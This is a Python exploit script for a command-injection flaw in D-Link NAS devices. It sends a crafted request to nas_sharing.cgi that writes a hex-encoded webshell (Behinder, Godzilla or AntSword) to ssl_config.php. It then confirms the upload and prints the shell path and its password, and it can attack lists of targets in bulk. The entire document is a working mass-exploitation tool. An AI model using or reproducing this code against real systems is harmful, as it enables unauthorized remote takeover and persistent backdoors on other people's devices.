import base64
import argparse
import requests
import sys
import os
from urllib.parse import urlparse
import urllib3


#Get_WebShell_Value 
cmd = int(input('请输入要使用的webshell : 1.冰蝎  2.哥斯拉  3.蚁剑 \n：'))

file = open('/home/f0re4t/project/D-link-RCE/Ant.php','r')
A = file.read()
file.close

file = open('/home/f0re4t/project/D-link-RCE/Godzila.php','r')
G = file.read()
file.close

file = open('/home/f0re4t/project/D-link-RCE/Behinder.php','r')
B = file.read()
file.close

# passwd:config
WebShell_Tools = {
    #Antb64
    "Antsword":  A,
    # xorb64
    "Godzila" : G, 
    #Behinder3
    "Behinder" : B
}

if cmd == 3:
    cmd = WebShell_Tools.get('Antsword')
elif cmd ==1:
    cmd = WebShell_Tools.get('Behinder')
elif cmd == 2:
    cmd = WebShell_Tools.get('Godzila')
else: 
    print("其余管理工具暂不支持")


# cmdline->hex->b64
cmd_hex = ''.join(f'\\\\x{ord(c):02x}' for c in cmd)
cmd_final = f"echo -e \"{cmd_hex}\" > ssl_config.php".replace(" ", "\t").replace("\n", "")
cmd_b64 = base64.b64encode(cmd_final.encode()).decode("utf-8").replace("+", "%2b")
# print(f"getshell命令为： {cmd_b64} ")


# exploit
def exp(target):
    if not urlparse(target).scheme:
        target = "http://" + target
    url = target + f"/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system={cmd_b64}"
    check_url = target + '/cgi-bin/nas_sharing?user=messagebus&passwd=&cmd=15&system=bHM='
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Cache-Control": "no-cache, no-store, max-age=0",
        "Accept-Encoding": "identity"
    }





    try:
        requests.get(url,headers=headers, verify=False)
        r = requests.get(check_url, headers=headers, verify=False)  # Set verify to True if using SSL/TLS
        print(r)
        if r.status_code != 200:
            return ""
        if 'config.php' in r.text.split("<?xml")[0]:
            print(f"上传webshell成功!\n路径为{target}/cgi-bin/ssl_config.php,连接密码为config")

    except requests.RequestException as e:
        print("[-] An error occurred:", str(e))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="D-link-rce POC")
    parser.add_argument("-u", "--url", dest="target_url", help="Target URL")
    parser.add_argument("-f", "--file", dest="file_path", help="File containing target URLs")

    args = parser.parse_args()

    if not args.target_url and not args.file_path:
        parser.print_help()
        sys.exit(1)

    if args.target_url:
        exp(args.target_url)
    
    if args.file_path:
        with open(args.file_path, "r") as file:
            for line in file:
                target_url = line.strip()
                exp(target_url)